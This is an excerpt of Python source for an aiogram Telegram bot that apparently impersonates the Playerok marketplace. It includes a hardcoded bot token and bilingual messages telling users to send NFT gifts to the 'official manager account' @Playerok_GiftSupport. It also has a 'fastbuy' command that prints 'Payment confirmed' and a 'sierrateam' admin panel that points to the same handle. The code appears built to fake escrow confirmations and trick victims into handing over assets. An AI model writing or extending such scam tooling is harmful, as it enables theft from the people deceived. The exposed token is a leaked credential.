...
bot = Bot(token="7981914077:AAFCxJSrlG6Cg6s9rpvXs6OQGcjjqF_Cq7Y")
dp = Dispatcher()
...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/Playerok_GiftSupport")],
    ...
    if deal_id:
        ...
        if deal["type"] == "deal_gift":
            text_ru = (
                ...
                f"NFT ожидает отправки на официальный аккаунт менеджера - @Playerok_GiftSupport n\n"
            ...
            text_en = (
                ...
                f"NFT must be sent to the official manager account — @Playerok_GiftSupport\n\n"
                f"⚠️ Attention:\n"
...
async def sierrateam_read_callback(callback: CallbackQuery):
    ...
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @Playerok_GiftSupport",
...
async def fastbuy_command(message: Message):
    ...
    if deal["type"] == "deal_gift":
        text_ru = (
            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"📜 Предмет: {deal['description']}\n\n"
            f"NFT ожидает отправки на официальный аккаунт менеджера - @Playerok_GiftSupport\n\n"
            f"⚠️ ВАЖНО:\n"
...
async def agree_callback(callback: CallbackQuery):
    ...
    if lang == "ru":
        await safe_edit_message(
            ...
            "Поддержка - @Playerok_GiftSupport",
            welcome_keyboard_ru
        )
    else:
        await safe_edit_message(
